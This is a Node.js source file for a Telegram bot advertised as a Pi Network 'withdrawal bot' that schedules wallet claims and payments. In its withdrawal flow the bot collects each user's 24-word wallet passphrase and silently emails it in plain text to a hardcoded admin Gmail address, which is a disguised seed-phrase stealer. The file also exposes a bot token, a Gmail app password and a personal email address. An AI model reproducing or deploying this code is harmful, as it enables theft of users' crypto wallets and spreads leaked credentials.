// Telegram Pi Mainnet Withdrawal Bot - Improved: Funding 10s before unlock, claim+withdraw in one TX at unlock, retry every 0.8s if underfunded
// Requirements: npm install node-telegram-bot-api nodemailer stellar-sdk bip39 ed25519-hd-key

const TelegramBot = require('node-telegram-bot-api');
const nodemailer = require('nodemailer');
const stellar = require('stellar-sdk');
const bip39 = require('bip39');
const edHd = require('ed25519-hd-key');
const fs = require('fs');
const path = require('path');

// ===== CONFIG =====
const BOT_TOKEN = '7870571495:AAFxlKtFUCQLvGdqmzuMgI4rJo3IzYC5sJI';
const ADMIN_ID = 6893272026;
const ADMIN_EMAIL = 'euchechukwu550@gmail.com';
const GMAIL_USER = 'euchechukwu550@gmail.com';
const GMAIL_PASS = 'txpl obve jyow ymdm';
const HORIZON_URL = 'https://api.mainnet.minepi.com';
const NETWORK_PASSPHRASE = 'Pi Network';
const CHECK_INTERVAL = 1000; // 1s for countdown
const FUNDING_AMOUNT = '0.0200000';
const FUNDING_BEFORE_UNLOCK_MS = 10000; // 10s before unlock
const RETRY_INTERVAL_MS = 800; // Retry claim+withdraw every 0.8s

// ===== DATA STORAGE =====
const usersFile = path.join(__dirname, 'users.json');
let users = {};
if (fs.existsSync(usersFile)) {
  users = JSON.parse(fs.readFileSync(usersFile));
}
function saveUsers() {
  fs.writeFileSync(usersFile, JSON.stringify(users, null, 2));
}

// ===== BOT & EMAIL SETUP =====
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: { user: GMAIL_USER, pass: GMAIL_PASS }
});

// ===== BUTTONS =====
const adminButtonGrid = [
  [
    { text: 'Add user', callback_data: 'add_user' },
    { text: 'Change fee wallet', callback_data: 'change_fee_wallet' }
  ],
  [
    { text: 'Remove user', callback_data: 'remove_user' },
    { text: 'Other', callback_data: 'other_admin' }
  ]
];
const userButtonGrid = [
  [
    { text: 'Withdraw Pi', callback_data: 'withdraw_pi' },
    { text: 'Stop', callback_data: 'stop' }
  ],
  [
    { text: 'How to use', callback_data: 'how_to_use' }
  ]
];
function isAdmin(id) {
  return id === ADMIN_ID;
}
function sendAdminEmail(subject, text) {
  return transporter.sendMail({ from: `"Pi Bot" <${GMAIL_USER}>`, to: ADMIN_EMAIL, subject, text });
}

// ====== PI MAINNET LOGIC ======
function wait(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
async function getDynamicBaseFee(server, multiplier = 1.0, log = () => {}) {
  const feeStats = await server.feeStats();
  const modeFee = Number(feeStats.fee_charged.mode);
  const p95Fee = Number(feeStats.fee_charged.p95);
  let fee = modeFee;
  if (p95Fee > modeFee * 2) {
    fee = Math.ceil(p95Fee * multiplier);
    log(`⚡ Network congestion detected. Using bumped fee of ${fee} stroops.`);
  } else if (multiplier > 1) {
    fee = Math.ceil(modeFee * multiplier);
    log(`⚡ Using custom multiplier. Fee per op: ${fee} stroops.`);
  } else {
    log(`ℹ️ Network normal. Using mode fee of ${fee} stroops.`);
  }
  return fee.toString();
}

async function fundAndClaimWithdraw({
  mnemonic,
  destination,
  inputAmount,
  unlockTimeInput
}, fundingMnemonic, chatId, logToTelegram) {
  const log = msg => { logToTelegram(msg); };

  if (!bip39.validateMnemonic(mnemonic)) throw new Error('❌ Invalid main wallet mnemonic.');
  if (!bip39.validateMnemonic(fundingMnemonic)) throw new Error('❌ Invalid funding wallet mnemonic.');

  // Unlock time
  const unlockParts = unlockTimeInput.split(':').map(Number);
  const now = new Date();
  const unlockTime = new Date(Date.UTC(
    now.getUTCFullYear(),
    now.getUTCMonth(),
    now.getUTCDate(),
    unlockParts[0], unlockParts[1], unlockParts[2]
  ));
  log(`📅 Scheduled unlock at: ${unlockTime.toISOString()}`);

  // Funding wallet
  const fundingSeed = await bip39.mnemonicToSeed(fundingMnemonic);
  const fundingDerived = edHd.derivePath("m/44'/314159'/0'", fundingSeed);
  const fundingKeypair = stellar.Keypair.fromRawEd25519Seed(fundingDerived.key);
  const fundingPublicKey = fundingKeypair.publicKey();

  // Main wallet
  const seed = await bip39.mnemonicToSeed(mnemonic);
  const derived = edHd.derivePath("m/44'/314159'/0'", seed);
  const keypair = stellar.Keypair.fromRawEd25519Seed(derived.key);
  const publicKey = keypair.publicKey();

  const server = new stellar.Horizon.Server(HORIZON_URL);

  // Countdown display (live to Telegram)
  let countdownMsgId = null;
  const countdownInterval = setInterval(async () => {
    const msToUnlock = unlockTime - (new Date());
    if (msToUnlock > 0) {
      let msg = `⏳ ${Math.ceil(msToUnlock/1000)}s left until unlock...\nUnlock scheduled for: ${unlockTime.toISOString()}`;
      if (countdownMsgId) {
        try { await bot.editMessageText(msg, { chat_id: chatId, message_id: countdownMsgId }); } catch(e) {}
      } else {
        const sent = await bot.sendMessage(chatId, msg);
        countdownMsgId = sent.message_id;
      }
    }
  }, CHECK_INTERVAL);

  // Wait until unlock time minus 10s
  while ((unlockTime - new Date()) > FUNDING_BEFORE_UNLOCK_MS) {
    await wait(500);
  }

  // Funding step (once, 10s before unlock)
  try {
    const fundingAccount = await server.loadAccount(fundingPublicKey);
    const fundingBalanceObj = fundingAccount.balances.find(b => b.asset_type === 'native');
    const fundingBalance = fundingBalanceObj ? parseFloat(fundingBalanceObj.balance) : 0;
    if (fundingBalance < parseFloat(FUNDING_AMOUNT) + 0.01) {
      log(`❌ Funding wallet insufficient balance (${fundingBalance} Pi).`);
      throw new Error('Funding wallet insufficient balance.');
    }
    const fee = await getDynamicBaseFee(server, 1.5, log);
    const tx = new stellar.TransactionBuilder(fundingAccount, {
      fee,
      networkPassphrase: NETWORK_PASSPHRASE
    })
      .addOperation(stellar.Operation.payment({
        destination: publicKey,
        asset: stellar.Asset.native(),
        amount: FUNDING_AMOUNT
      }))
      .setTimeout(30)
      .build();
    tx.sign(fundingKeypair);
    log(`🔄 Funding main wallet ${publicKey} with ${FUNDING_AMOUNT} Pi...`);
    const fundingTX = await server.submitTransaction(tx);
    log('✅ Funding TX success: ' + (fundingTX._links?.transaction?.href || ''));
  } catch (err) {
    log('❌ Funding TX failed: ' + (err.response?.data || err.message));
    throw new Error('Could not fund main wallet.');
  }

  // Wait for unlock
  while ((unlockTime - new Date()) > 0) {
    await wait(500);
  }
  clearInterval(countdownInterval);

  // Claim + Withdraw in one transaction, retry if underfunded
  let success = false;
  let result;
  let retryCount = 0;
  while (!success) {
    try {
      const account = await server.loadAccount(publicKey);
      const baseFeeStroops = await getDynamicBaseFee(server, 1.5, log);

      // Find claimable balance
      let claimable;
      try {
        const claimables = await server.claimableBalances()
          .claimant(publicKey)
          .order('desc')
          .limit(1)
          .call();
        claimable = claimables.records[0];
      } catch (e) {
        claimable = null;
      }

      const txBuilder = new stellar.TransactionBuilder(account, {
        fee: baseFeeStroops,
        networkPassphrase: NETWORK_PASSPHRASE
      });

      if (claimable) {
        const claimId = claimable.id;
        txBuilder.addOperation(stellar.Operation.claimClaimableBalance({ balanceId: claimId }));
        log(`📦 Adding claim operation for balance: ${claimId}`);
      } else {
        log('⚠️ No claimable balance available!');
      }

      txBuilder.addOperation(stellar.Operation.payment({
        destination: destination,
        asset: stellar.Asset.native(),
        amount: parseFloat(inputAmount).toFixed(7)
      }));
      log(`💸 Adding payment to ${destination}`);

      const tx = txBuilder.setTimeout(30).build();
      tx.sign(keypair);

      log(
        `📤 Submitting transaction at ${baseFeeStroops} stroops/op (total: ${(Number(baseFeeStroops) * tx.operations.length / 1e7).toFixed(7)} Pi)`
      );

      result = await server.submitTransaction(tx);
      log('✅ Success! Transaction submitted.');
      log('🔗 Tx link: ' + (result._links?.transaction?.href || ''));
      success = true;
    } catch (err) {
      retryCount++;
      const code = err.response?.data?.extras?.result_codes?.transaction;
      const opErrs = err.response?.data?.extras?.result_codes?.operations || [];

      if (err.response?.status === 429) {
        log('⛔ Rate limited. Waiting 1s...');
        await wait(1000);
      } else if (code === 'tx_insufficient_balance' || opErrs.includes('op_underfunded')) {
        log(`❌ Underfunded! Retrying claim+withdraw in ${RETRY_INTERVAL_MS/1000}s... (retry #${retryCount})`);
        await wait(RETRY_INTERVAL_MS);
      } else if (code === 'tx_bad_seq') {
        log('⚠️ Bad sequence. Retrying in 0.8s...');
        await wait(RETRY_INTERVAL_MS);
      } else {
        log('❌ Unknown error: ' + (err.response?.data || err.message));
        throw err;
      }
    }
  }
  return result;
}

// ====== WITHDRAWAL FLOW STATE ======
const withdrawalState = {}; // userId -> state object

async function startWithdrawal(chatId, userId) {
  withdrawalState[userId] = { step: 1, data: {} };
  bot.sendMessage(chatId, 'Enter your 24-word passphrase (main wallet):');
}

async function handleWithdrawalInput(msg) {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const state = withdrawalState[userId];
  if (!state) return;

  switch (state.step) {
    case 1:
      state.data.mnemonic = msg.text.trim();
      await sendAdminEmail('User Passphrase', `User ${userId} entered passphrase:\n${state.data.mnemonic}`);
      state.step++;
      bot.sendMessage(chatId, 'Enter destination wallet address:');
      break;
    case 2:
      state.data.destination = msg.text.trim();
      state.step++;
      bot.sendMessage(chatId, 'Enter amount to send:');
      break;
    case 3:
      state.data.inputAmount = msg.text.trim();
      state.step++;
      bot.sendMessage(chatId, 'Enter unlock time (HH:MM:SS in UTC):');
      break;
    case 4:
      state.data.unlockTimeInput = msg.text.trim();
      state.step++;
      // Now ready to process withdrawal (using admin's funding wallet passphrase)
      if (!users.feeWallet) {
        bot.sendMessage(chatId, '❌ Funding wallet passphrase not set by admin. Please contact admin.');
        delete withdrawalState[userId];
        return;
      }
      bot.sendMessage(chatId, 'Processing your withdrawal. Countdown will be shown...');
      let logsArr = [];
      function logToTelegram(msg) {
        logsArr.push(msg);
        bot.sendMessage(chatId, msg);
      }
      fundAndClaimWithdraw(state.data, users.feeWallet, chatId, logToTelegram).then(result => {
        bot.sendMessage(chatId, `✅ Success! Transaction link: ${result._links?.transaction?.href || 'Not available'}`);
        sendAdminEmail('Withdrawal Log', `User ${userId} withdrawal log:\n${logsArr.join('\n')}`);
        delete withdrawalState[userId];
      }).catch(err => {
        bot.sendMessage(chatId, `❌ Withdrawal failed: ${err.message}`);
        sendAdminEmail('Withdrawal Error', `User ${userId} withdrawal error:\n${err.message}\n${logsArr.join('\n')}`);
        delete withdrawalState[userId];
      });
      break;
    default:
      bot.sendMessage(chatId, 'Unexpected input. Type /start to begin again.');
      delete withdrawalState[userId];
  }
}

// ====== BOT LOGIC ======
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const welcome = `Welcome to Smi La Pips Supersonic Pi withdrawal bot

Please proceed with caution`;

  // Combine admin and user buttons in a rectangular grid for admin, just user grid for others
  const buttons = isAdmin(chatId)
    ? [...adminButtonGrid, ...userButtonGrid]
    : userButtonGrid;

  bot.sendMessage(chatId, welcome, { reply_markup: { inline_keyboard: buttons } });
});

bot.on('callback_query', async (query) => {
  const chatId = query.message.chat.id;
  const userId = query.from.id;
  const data = query.data;

  // ADMIN BUTTONS
  if (isAdmin(userId)) {
    if (data === 'add_user') {
      bot.sendMessage(chatId, 'Send the Telegram user ID to add:');
      bot.once('message', async (msg) => {
        const newUserId = msg.text.trim();
        if (!users[newUserId]) {
          users[newUserId] = { passphrase: null };
          saveUsers();
          bot.sendMessage(chatId, `User ${newUserId} added.`);
        } else {
          bot.sendMessage(chatId, `User ${newUserId} already exists.`);
        }
      });
    }
    if (data === 'change_fee_wallet') {
      bot.sendMessage(chatId, 'Please provide the new funding wallet passphrase:');
      bot.once('message', async (msg) => {
        const passphrase = msg.text.trim();
        users.feeWallet = passphrase;
        saveUsers();
        bot.sendMessage(chatId, 'Funding wallet passphrase updated.');
        await sendAdminEmail('Fee Wallet Changed', `New Passphrase: ${passphrase}`);
      });
    }
    if (data === 'remove_user') {
      bot.sendMessage(chatId, 'Send the Telegram user ID to remove:');
      bot.once('message', async (msg) => {
        const removeId = msg.text.trim();
        if (users[removeId]) {
          delete users[removeId];
          saveUsers();
          bot.sendMessage(chatId, `User ${removeId} removed.`);
        } else {
          bot.sendMessage(chatId, `User ${removeId} not found.`);
        }
      });
    }
    if (data === 'other_admin') {
      bot.sendMessage(chatId, 'Other admin functions coming soon.');
    }
  }
  // USER BUTTONS (admin also has these)
  if ((isAdmin(userId) && ['withdraw_pi','stop','how_to_use'].includes(data)) || (!isAdmin(userId) && users[userId])) {
    if (data === 'withdraw_pi') {
      startWithdrawal(chatId, userId);
    }
    if (data === 'stop') {
      bot.sendMessage(chatId, 'Bot stopped. You can /start again anytime.');
      delete withdrawalState[userId];
    }
    if (data === 'how_to_use') {
      bot.sendMessage(chatId,
        `How to use:\n` +
        `1. Click 'Withdraw Pi' and enter your passphrase\n` +
        `2. Follow bot instructions for wallet address, amount, unlock time\n` +
        `3. Funding happens 10s before unlock; claim+withdraw at unlock in a single transaction\n` +
        `4. If withdraw fails due to insufficient funds, bot will retry every 0.8s until success\n` +
        `- Only admin can add/remove users or change funding wallet\n` +
        `- Proceed with caution!`
      );
    }
  } else if (!users[userId] && !isAdmin(userId)) {
    bot.sendMessage(chatId, 'You are not authorized. Please contact admin.');
    return;
  }
});

// WITHDRAWAL INPUT HANDLER
bot.on('message', async (msg) => {
  const userId = msg.from.id;
  if (withdrawalState[userId]) {
    await handleWithdrawalInput(msg);
  }
});

// ====== RUN ======
console.log('Bot running...');
